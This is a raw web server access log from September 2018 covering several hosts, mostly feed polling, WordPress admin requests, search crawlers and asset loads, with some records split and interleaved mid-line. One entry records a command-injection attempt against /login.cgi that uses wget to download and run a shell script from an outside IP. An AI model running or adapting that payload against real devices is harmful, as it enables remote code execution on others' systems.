hackschool.dmaster.org:80 84.238.224.47 - - [14/Sep/2018:11:11:18 +0300] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 1355 498 "http://hackerschool-bg.com/wp-admin/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.81 Safari/537.36" - 205688 - 15910
www.telebid-pro.com:80 104.154.198.228 - - [14/Sep/2018:11:11:23 +0300] "GET /?feed=comments-rss2 HTTP/1.1" 200 174 957 "-" "Java/1.8.0_121" - 40818 - 5145
hackschool.dmaster.org:80 84.238.224.47 - - [14/Sep/2018:11:11:52 +0300] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 2320 401 "http://www.hackerschool-bg.com/wp-admin/edit.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0" - 217811 - 17827
hackschool.dmaster.org:80 146.148.67.171 - - [14/Sep/2018:11:11:58 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 44492 "-" "Java/1.8.0_121" - 198252 - 17826
hackschool.dmaster.org:80 84.238.224.47 - - [14/Sep/2018:11:13:19 +0300] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 1355 498 "http://hackerschool-bg.com/wp-admin/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.81 Safari/537.36" - 229999 - 5147
hackschool.dmaster.org:80 84.238.224.47 - - [14/Sep/2018:11:13:52 +0300] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 2320 401 "http://www.hackerschool-bg.com/wp-admin/edit.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0" - 220040 - 5139
hackschool.dmaster.org:80 84.238.224.47 - - [14/Sep/2018:11:15:20 +0300] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 1355 498 "http://hackerschool-bg.com/wp-admin/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.81 Safari/537.36" - 197176 - 15909
www.telebid-pro.com:80 104.197.197.203 - - [14/Sep/2018:11:15:27 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 1135 "-" "Java/1.8.0_121" - 69769 - 5141
hackschool.dmaster.org:80 84.238.224.47 - - [14/Sep/2018:11:15:29 +0300] "GET /wp-login.php?action=logout&_wpnonce=85e9b884bf HTTP/1.1" 302 1034 2231 "http://hackerschool-bg.com/wp-admin/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.81 Safari/537.36" - 69088 - 8237
hackschool.dmaster.org:80 84.238.224.47 - - [14/Sep/41.42.196.26 - - [14/Sep/2018:11:16:48 +0300] "GET /login.cgi?cli=aa%20aa%27;wget%20http://80.211.173.159/k%20-O%20/tmp/ks;chmod%20777%20/tmp/ks;sh%20/tmp/ks%27$ HTTP/1.1" 400 216 0 "-" "LMAO/2.0" - 31 - 17827
2018:11:15:29 +0300] "GET /wp-login.php?loggedout=true HTTP/1.1" 200 829 2697 "http://hackerschool-bg.com/wp-admin/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.81 Safari/537.36" - 79595 - 5135
www.telebid-pro.com:80 104.154.198.228 - - [14/Sep/2018:11:15:47 +0300] "GET /?feed=rss2 HTTP/1.1" 200 165 1123 "-" "Java/1.8.0_121" - 39050 - 15910
hackschool.dmaster.org:80 84.238.224.47 - - [14/Sep/2018:11:15:52 +0300] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 2320 401 "http://www.hackerschool-bg.com/wp-admin/edit.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0" - 206276 - 5145
hackschool.dmaster.org:80 146.148.67.171 - - [14/Sep/2018:11:17:06 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 44492 "-" "Java/1.8.0_121" - 214291 - 17826
www.telebid-pro.com:80 104.154.198.228 - - [14/Sep/2018:11:17:27 +0300] "GET /?feed=comments-rss2 HTTP/1.1" 200 174 957 "-" "Java/1.8.0_121" - 36760 - 5147
hackschool.dmaster.org:80 84.238.224.47 - - [14/Sep/2018:11:17:52 +0300] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 2320 401 "http://www.hackerschool-bg.com/wp-admin/edit.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0" - 196820 - 5139
www.telebid-pro.com:80 104.197.197.203 - - [14/Sep/2018:11:19:29 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 1135 "-" "Java/1.8.0_121" - 58639 - 15909
www.telebid-pro.com:80 104.154.198.228 - - [14/Sep/2018:11:21:03 +0300] "GET /?feed=rss2 HTTP/1.1" 200 165 1123 "-" "Java/1.8.0_121" - 41903 - 5141
www.telebid-pro.com:80 18.216.12.5 - - [14/Sep/2018:11:22:01 +0300] "GET / HTTP/1.1" 200 125 28619 "-" "Mozilla/5.0 Firefox/33.0" - 88273 - 8237
hackschool.dmaster.org:80 146.148.67.171 - - [14/Sep/2018:11:22:51 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 44492 "-" "Java/1.8.0_121" - 198740 - 5145
www.telebid-pro.com:80 104.197.197.203 - - [14/Sep/2018:11:23:20 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 1135 "-" "Java/1.8.0_121" - 37455 - 17827
www.telebid-pro.com:80 104.154.198.228 - - [14/Sep/2018:11:24:38 +0300] "GET /?feed=comments-rss2 HTTP/1.1" 200 174 957 "-" "Java/1.8.0_121" - 80905 - 5147
tbcloud.dmaster.org:80 66.249.69.251 - - [14/Sep/2018:11:26:27 +0300] "GET /?feed=comments-rss2 HTTP/1.1" 200 438 2706 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" - 49921 - 5139
www.telebid-pro.com:80 104.197.197.203 - - [14/Sep/2018:11:27:36 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 1135 "-" "Java/1.8.0_121" - 75980 - 15909
www.telebid-pro.com:80 180.76.15.146 - - [14/Sep/2018:11:28:26 +0300] "GET /?p=26 HTTP/1.1" 301 226 394 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" - 36351 - 5141
www.telebid-pro.com:80 180.76.15.155 - - [14/Sep/2018:11:28:27 +0300] "GET /?recent_works=smsmms-gateway HTTP/1.1" 200 249 4112 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" - 122488 - 8237
www.telebid-pro.com:80 180.76.15.161 - - [14/Sep/2018:11:28:28 +0300] "GET /robots.txt HTTP/1.1" 404 221 372 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2" - 127 - 5135
www.telebid-pro.com:80 104.154.198.228 - - [14/Sep/2018:11:28:35 +0300] "GET /?feed=rss2 HTTP/1.1" 200 165 1123 "-" "Java/1.8.0_121" - 40327 - 15910
hackschool.dmaster.org:80 146.148.67.171 - - [14/Sep/2018:11:28:45 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 44492 "-" "Java/1.8.0_121" - 198284 - 5145
www.telebid-pro.com:80 104.154.198.228 - - [14/Sep/2018:11:30:54 +0300] "GET /?feed=comments-rss2 HTTP/1.1" 200 174 957 "-" "Java/1.8.0_121" - 39470 - 17827
www.telebid-pro.com:80 104.197.197.203 - - [14/Sep/2018:11:31:35 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 1135 "-" "Java/1.8.0_121" - 37686 - 17826
www.telebid-pro.com:80 18.216.137.18 - - [14/Sep/2018:11:31:59 +0300] "GET / HTTP/1.1" 200 222 6781 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Chrome/67.0.3396.79 Safari/537.36" - 86873 - 5147
hackschool.dmaster.org:80 146.148.67.171 - - [14/Sep/2018:11:32:55 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 44492 "-" "Java/1.8.0_121" - 206896 - 5139
www.telebid-pro.com:80 104.154.198.228 - - [14/Sep/2018:11:35:16 +0300] "GET /?feed=rss2 HTTP/1.1" 200 165 1123 "-" "Java/1.8.0_121" - 37440 - 15909
www.telebid-pro.com:80 104.197.197.203 - - [14/Sep/2018:11:36:42 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 1135 "-" "Java/1.8.0_121" - 37884 - 5141
hackschool.dmaster.org:80 146.148.67.171 - - [14/Sep/2018:11:36:46 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 44492 "-" "Java/1.8.0_121" - 196336 - 8237
www.telebid-pro.com:80 104.154.198.228 - - [14/Sep/2018:11:38:03 +0300] "GET /?feed=comments-rss2 HTTP/1.1" 200 174 957 "-" "Java/1.8.0_121" - 45942 - 17826
hackschool.dmaster.org:80 146.148.67.171 - - [14/Sep/2018:11:40:32 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 44492 "-" "Java/1.8.0_121" - 267338 - 5141
www.telebid-pro.com:80 104.197.197.203 - - [14/Sep/2018:11:41:26 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 1135 "-" "Java/1.8.0_121" - 37531 - 8237
www.telebid-pro.com:80 104.154.198.228 - - [14/Sep/2018:11:41:30 +0300] "GET /?feed=rss2 HTTP/1.1" 200 165 1123 "-" "Java/1.8.0_121" - 37625 - 5135
www.telebid-pro.com:80 104.154.198.228 - - [14/Sep/2018:11:43:14 +0300] "GET /?feed=comments-rss2 HTTP/1.1" 200 174 957 "-" "Java/1.8.0_121" - 37653 - 5141
www.telebid-pro.com:80 104.197.197.203 - - [14/Sep/2018:11:45:09 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 1135 "-" "Java/1.8.0_121" - 49533 - 17826
hackschool.dmaster.org:80 49.44.122.165 - - [14/Sep/2018:11:45:42 +0300] "GET / HTTP/1.1" 200 580 6913 "http://www.google.com/" "Mozilla/5.0 (Linux; Android 6.0; CPH1609 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36" - 79259 - 5147
hackschool.dmaster.org:80 49.44.122.165 - - [14/Sep/2018:11:45:44 +0300] "GET /wp-content/themes/ninezeroseven-child/style.css?ver=4.1 HTTP/1.1" 200 543 1789 "http://hackerschool-bg.com/" "Mozilla/5.0 (Linux; Android 6.0; CPH1609 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36" - 326 - 5139
hackschool.dmaster.org:80 49.44.122.165 - - [14/Sep/2018:11:45:44 +0300] "GET /wp-content/themes/ninezeroseven/assets/css/layout.css?ver=4.1 HTTP/1.1" 200 549 6900 "http://hackerschool-bg.com/" "Mozilla/5.0 (Linux; Android 6.0; CPH1609 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36" - 901 - 15909
hackschool.dmaster.org:80 49.44.122.165 - - [14/Sep/2018:11:45:44 +0300] "GET /wp-content/themes/ninezeroseven/assets/css/prettyPhoto.css?ver=4.1 HTTP/1.1" 200 554 2176 "http://hackerschool-bg.com/" "Mozilla/5.0 (Linux; Android 6.0; CPH1609 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36" - 297 - 5141
hackschool.dmaster.org:80 49.44.122.165 - - [14/Sep/2018:11:45:44 +0300] "GET /wp-content/themes/ninezeroseven/assets/css/skeleton.css?ver=4.1 HTTP/1.1" 200 551 1292 "http://hackerschool-bg.com/" "Mozilla/5.0 (Linux; Android 6.0; CPH1609 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36" - 210 - 8237
hackschool.dmaster.org:80 49.44.122.165 - - [14/Sep/2018:11:45:44 +0300] "GET /wp-content/themes/ninezeroseven/assets/css/base.css?ver=4.1 HTTP/1.1" 200 547 2671 "http://hackerschool-bg.com/" "Mozilla/5.0 (Linux; Android 6.0; CPH1609 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36" - 333 - 5135
hackschool.dmaster.org:80 49.44.122.165 - - [14/Sep/2018:11:45:44 +0300] "GET /wp-content/plugins/google-captcha/css/gglcptch.css?ver=1.30 HTTP/1.1" 200 547 682 "http://hackerschool-bg.com/" "Mozilla/5.0 (Linux; Android 6.0; CPH1609 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36" - 210 - 15910
hackschool.dmaster.org:80 49.44.122.165 - - [14/Sep/2018:11:45:45 +0300] "GET /wp-content/themes/ninezeroseven/assets/css/nzs-frame-media.css?ver=4.1 HTTP/1.1" 200 558 1096 "http://hackerschool-bg.com/" "Mozilla/5.0 (Linux; Android 6.0; CPH1609 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36" - 377 - 5145
hackschool.dmaster.org:80 49.44.122.165 - - [14/Sep/2018:11:45:45 +0300] "GET /wp-content/plugins/tb2048game/style/main.css?ver=4.1 HTTP/1.1" 200 540 3127 "http://hackerschool-bg.com/" "Mozilla/5.0 (Linux; Android 6.0; CPH1609 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36" - 668 - 17827
hackschool.dmaster.org:80 49.44.122.165 - - [14/Sep/2018:11:45:45 +0300] "GET /wp-content/themes/ninezeroseven/mobile-media-queries.css?ver=4.1 HTTP/1.1" 200 552 722 "http://hackerschool-bg.com/" "Mozilla/5.0 (Linux; Android 6.0; CPH1609 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36" - 233 - 17826
hackschool.dmaster.org:80 49.44.122.165 - - [14/Sep/2018:11:45:45 +0300] "GET /wp-content/themes/ninezeroseven/assets/css/flexslider.css?ver=4.1 HTTP/1.1" 200 553 1630 "http://hackerschool-bg.com/" "Mozilla/5.0 (Linux; An::1 - - [14/Sep/2018:11:45:46 +0300] "OPTIONS * HTTP/1.0" 200 101 110 "-" "Apache/2.4.10 (Debian) OpenSSL/1.0.1t (internal dummy connection)" - 56 - 5141
droid 6.0; CPH1609 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36" - 346 - 5139
hackschool.dmaster.org:80 49.44.122.165 - - [14/Sep/2018:11:45:45 +0300] "GET /wp-includes/js/jquery/jquery.js?ver=1.11.1 HTTP/1.1" 200 515 33532 "http://hackerschool-bg.com/" "Mozilla/5.0 (Linux; Android 6.0; CPH1609 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36" - 6205 - 5147
hackschool.dmaster.org:80 49.44.122.165 - - [14/Sep/2018:11:45:45 +0300] "GET /wp-content/themes/ninezeroseven/assets/css/nzs-custom-media.css?ver=4.1 HTTP/1.1" 200 559 1489 "http://hackerschool-bg.com/" "Mozilla/5.0 (Linux; Android 6.0; CPH1609 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36" - 377 - 15909
hackschool.dmaster.org:80 49.44.122.165 - - [14/Sep/2018:11:45:46 +0300] "GET /wp-includes/js/jquery/jquery-migrate.min.js?ver=1.2.1 HTTP/1.1" 200 526 3367 "http://hackerschool-bg.com/" "Mozilla/5.0 (Linux; Android 6.0; CPH1609 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36" - 474 - 8237
hackschool.dmaster.org:80 49.44.122.165 - - [14/Sep/2018:11:45:47 +0300] "GET /wp-content/themes/ninezeroseven-child//js/blog_post_modif.js?ver=1.0.0 HTTP/1.1" 200 544 472 "http://hackerschool-bg.com/" "Mozilla/5.0 (Linux; Android 6.0; CPH1609 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36" - 205 - 5135
hackschool.dmaster.org:80 49.44.122.165 - - [14/Sep/2018:11:45:47 +0300] "GET /wp-content/themes/ninezeroseven/assets/js/jquery.flexslider-min.js?ver=1.0 HTTP/1.1" 200 547 5465 "http://hackerschool-bg.com/" "Mozilla/5.0 (Linux; Android 6.0; CPH1609 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36" - 794 - 15910
hackschool.dmaster.org:80 49.44.122.165 - - [14/Sep/2018:11:45:47 +0300] "GET /wp-content/themes/ninezeroseven/assets/js/scripts.js?ver=1.0 HTTP/1.1" 200 533 11922 "http://hackerschool-bg.com/" "Mozilla/5.0 (Linux; Android 6.0; CPH1609 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36" - 1546 - 17551
hackschool.dmaster.org:80 49.44.122.165 - - [14/Sep/2018:11:45:47 +0300] "GET /wp-content/themes/ninezeroseven/assets/js/jquery.prettyPhoto.js?ver=1.0 HTTP/1.1" 200 544 6330 "http://hackerschool-bg.com/" "Mozilla/5.0 (Linux; Android 6.0; CPH1609 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36" - 657 - 5145
hackschool.dmaster.org:80 49.44.122.165 - - [14/Sep/2018:11:45:47 +0300] "GET /wp-content/plugins/tb2048game/js/require.js HTTP/1.1" 200 516 6529 "http://hackerschool-bg.com/" "Mozilla/5.0 (Linux; Android 6.0; CPH1609 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36" - 554 - 17827
hackschool.dmaster.org:80 49.44.122.165 - - [14/Sep/2018:11:45:47 +0300] "GET /wp-content/themes/ninezeroseven/assets/js/main.js?ver=1.0 HTTP/1.1" 200 530 2874 "http://hackerschool-::1 - - [14/Sep/2018:11:45:58 +0300] "OPTIONS * HTTP/1.0" 200 101 110 "-" "Apache/2.4.10 (Debian) OpenSSL/1.0.1t (internal dummy connection)" - 85 - 5135
bg.com/" "Mozilla/5.0 (Linux; Android 6.0; CPH1609 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36" - 555 - 17826
hackschool.dmaster.org:80 146.148.67.171 - - [14/Sep/2018:11:45:48 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 44492 "-" "Java/1.8.0_121" - 201770 - 15910
hackschool.dmaster.org:80 49.44.122.165 - - [14/Sep/2018:11:45:49 +0300] "GET /wp-content/plugins/tb2048game/js/game.mini.js HTTP/1.1" 200 601 4162 "http://hackerschool-bg.com/" "Mozilla/5.0 (Linux; Android 6.0; CPH1609 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36" - 595 - 17827
hackschool.dmaster.org:80 49.44.122.165 - - [14/Sep/2018:11:45:49 +0300] "GET /wp-content/plugins/tb2048game/js/easyModal.js HTTP/1.1" 200 601 1905 "http://hackerschool-bg.com/" "Mozilla/5.0 (Linux; Android 6.0; CPH1609 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36" - 400 - 17826
www.telebid-pro.com:80 104.154.198.228 - - [14/Sep/2018:11:46:35 +0300] "GET /?feed=rss2 HTTP/1.1" 200 165 1123 "-" "Java/1.8.0_121" - 38152 - 8237
hackschool.dmaster.org:80 54.184.167.128 - - [14/Sep/2018:11:47:17 +0300] "GET / HTTP/1.1" 200 351 6913 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.101 Safari/537.36" - 92791 - 17552
tbcloud.dmaster.org:80 46.118.121.233 - - [14/Sep/2018:11:47:27 +0300] "GET / HTTP/1.0" 200 202 15209 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36" - 109155 - 5147
tbcloud.dmaster.org:80 46.118.121.233 - - [14/Sep/2018:11:47:27 +0300] "GET / HTTP/1.0" 200 202 15209 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36" - 106681 - 17827
tbcloud.dmaster.org:80 46.118.121.233 - - [14/Sep/2018:11:47:27 +0300] "GET /http:/ HTTP/1.0" 404 208 368 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36" - 119 - 17826
www.telebid-pro.com:80 104.197.197.203 - - [14/Sep/2018:11:50:06 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 1135 "-" "Java/1.8.0_121" - 37754 - 5139
www.telebid-pro.com:80 104.154.198.228 - - [14/Sep/2018:11:50:35 +0300] "GET /?feed=comments-rss2 HTTP/1.1" 200 174 957 "-" "Java/1.8.0_121" - 53677 - 15910
hackschool.dmaster.org:80 146.148.67.171 - - [14/Sep/2018:11:51:24 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 44492 "-" "Java/1.8.0_121" - 203657 - 8237
www.pro-code.net:80 159.65.34.236 - - [14/Sep/2018:11:52:05 +0300] "GET / HTTP/1.1" 200 401 5093 "http://pro-code.net" "Mozilla/5.0 (X11; Datanyze; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" - 170707 - 17552
www.pro-code.net:80 78.128.6.29 - - [14/Sep/2018:11:52:06 +0300] "POST /wp-cron.php?doing_wp_cron=1536915125.9883959293365478515625 HTTP/1.0" 200 225 150 "-" "WordPress/4.1; http://pro-code.net" - 2740695 - 5147
www.telebid-pro.com:80 104.154.198.228 - - [14/Sep/2018:11:52:47 +0300] "GET /?fee72.54.160.198 - - [14/Sep/2018:11:56:57 +0300] "GET / HTTP/1.0" 403 18 373 "-" "-" - 202 - 5147
d=rss2 HTTP/1.1" 200 165 1123 "-" "Java/1.8.0_121" - 74820 - 15909
www.telebid-pro.com:80 104.197.197.203 - - [14/Sep/2018:11:54:30 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 1135 "-" "Java/1.8.0_121" - 83952 - 15910
hackschool.dmaster.org:80 146.148.67.171 - - [14/Sep/2018:11:56:33 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 44492 "-" "Java/1.8.0_121" - 196736 - 8237
www.pro-code.net:80 209.17.96.210 - - [14/Sep/2018:11:56:49 +0300] "GET / HTTP/1.1" 200 133 19671 "-" "Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)" - 102376 - 17552
www.telebid-pro.com:80 104.154.198.228 - - [14/Sep/2018:11:58:02 +0300] "GET /?feed=comments-rss2 HTTP/1.1" 200 174 957 "-" "Java/1.8.0_121" - 39917 - 5145
www.telebid-pro.com:80 104.154.198.228 - - [14/Sep/2018:11:58:46 +0300] "GET /?feed=rss2 HTTP/1.1" 200 165 1123 "-" "Java/1.8.0_121" - 36668 - 17551
www.telebid-pro.com:80 104.197.197.203 - - [14/Sep/2018:11:59:26 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 1135 "-" "Java/1.8.0_121" - 37214 - 5139
hackschool.dmaster.org:80 146.148.67.171 - - [14/Sep/2018:12:01:54 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 44492 "-" "Java/1.8.0_121" - 326133 - 5147
www.telebid-pro.com:80 18.188.94.118 - - [14/Sep/2018:12:02:02 +0300] "GET / HTTP/1.1" 200 249 6781 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.79 Safari/537.36" - 92012 - 17826
www.telebid-pro.com:80 104.197.197.203 - - [14/Sep/2018:12:02:57 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 1135 "-" "Java/1.8.0_121" - 40246 - 17827
www.telebid-pro.com:80 104.154.198.228 - - [14/Sep/2018:12:04:17 +0300] "GET /?feed=rss2 HTTP/1.1" 200 165 1123 "-" "Java/1.8.0_121" - 39319 - 15909
tbcloud.dmaster.org:80 66.249.69.253 - - [14/Sep/2018:12:04:54 +0300] "GET /?p=1 HTTP/1.1" 200 423 232042 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" - 1291742 - 5145
www.telebid-pro.com:80 104.154.198.228 - - [14/Sep/2018:12:04:57 +0300] "GET /?feed=comments-rss2 HTTP/1.1" 200 174 957 "-" "Java/1.8.0_121" - 36805 - 17551
www.telebid-pro.com:80 104.197.197.203 - - [14/Sep/2018:12:07:10 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 1135 "-" "Java/1.8.0_121" - 36636 - 5139
hackschool.dmaster.org:80 146.148.67.171 - - [14/Sep/2018:12:07:40 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 44492 "-" "Java/1.8.0_121" - 255961 - 15910
www.telebid-pro.com:80 104.154.198.228 - - [14/Sep/2018:12:09:45 +0300] "GET /?feed=rss2 HTTP/1.1" 200 165 1123 "-" "Java/1.8.0_121" - 49691 - 17827
www.telebid-pro.com:80 104.197.197.203 - - [14/Sep/2018:12:11:32 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 1135 "-" "Java/1.8.0_121" - 40016 - 15909
www.telebid-pro.com:80 104.154.198.228 - - [14/Sep/2018:12:11:53 +0300] "GET /?feed=comments-rss2 HTTP/1.1" 200 174 957 "-" "Java/1.8.0_121" - 39083 - 5145
hackschool.dmaster.org:80 146.148.67.171 - - [14/Sep/2018:12:12:04 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 44492 "-" "Java/1.8.0_121" - 208323 - 17551
hackschool.dmaster.org:80 146.148.67.171 - - [14/Sep/2018:12:16:19 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 44492 "-" "Java/1.8.0_121" - 204443 - 5139
www.telebid-pro.com:80 104.197.197.203 - - [14/Sep/2018:12:16:21 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 1135 "-" "Java/1.8.0_121" - 38349 - 15910
www.telebid-pro.com:80 104.154.198.228 - - [14/Sep/2018:12:16:46 +0300] "GET /?feed=rss2 HTTP/1.1" 200 165 1123 "-" "Java/1.8.0_121" - 40533 - 8237
www.telebid-pro.com:80 104.154.198.228 - - [14/Sep/2018:12:18:57 +0300] "GET /?feed=comments-rss2 HTTP/1.1" 200 174 957 "-" "Java/1.8.0_121" - 38278 - 17827
www.telebid-pro.com:80 104.197.197.203 - - [14/Sep/2018:12:19:52 +0300] "GET /?feed=rss2 HTTP/1.1" 200 169 1135 "-" "Java/1.8.0_121" - 36892 - 15909
hackschool.dmaster.org:80 178.154.171.26 - - [14/Sep/2018:12:19:58 +0300] "GET /robots.txt HTTP/1.1" 404 202 372 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" - 126 - 5145
hackschool.dmaster.org:80 95.108.213.12 - - [14/Sep/2018:12:19:58 +0300] "GET /robots.txt HTTP/1.1" 404 193 372 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" - 130 - 17551
hackschool.dmaster.org:80 178.154.171.26 - - [14/Sep/2018:12:19:58 +0300] "GET /robots.txt HTTP/1.1" 404 206 372 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" - 122 - 5139
hackschool.dmaster.org:80 178.154.171.26 - - [14/Sep/2018:12:20:02 +0300] "GET / HTTP/1.1" 200 284 6913 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" - 159801 - 15910
hackschool.dmaster.org:80 178.154.171.26 - - [14/Sep/2018:12:20:02 +0300] "GET / HTTP/1.1" 200 275 6911 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" - 79128 - 8237
hackschool.dmaster.org:80 95.108.213.12 - - [14/Sep/2018:12:20:02 +0300] "GET / HTTP/1.1" 200 288 6928 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" - 90345 - 17552
www.telebid-pro.com:80 66.249.69.84 - - [14/Sep/2018:12:21:26 +0300] "GET / HTTP/1.1" 200 292 6781 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" - 89281 - 8237
www.telebid-pro.com:80 141.8.142.169 - - [14/Sep/2018:12:21:49 +0300] "GET /robots.txt HTTP/1.1" 404 198 372 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" - 152 - 17552
www.telebid-pro.com:80 178.154.171.26 - - [14/Sep/2018:12:21:49 +0300] "GET /robots.txt HTTP/1.1" 404 202 372 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" - 119 - 5147
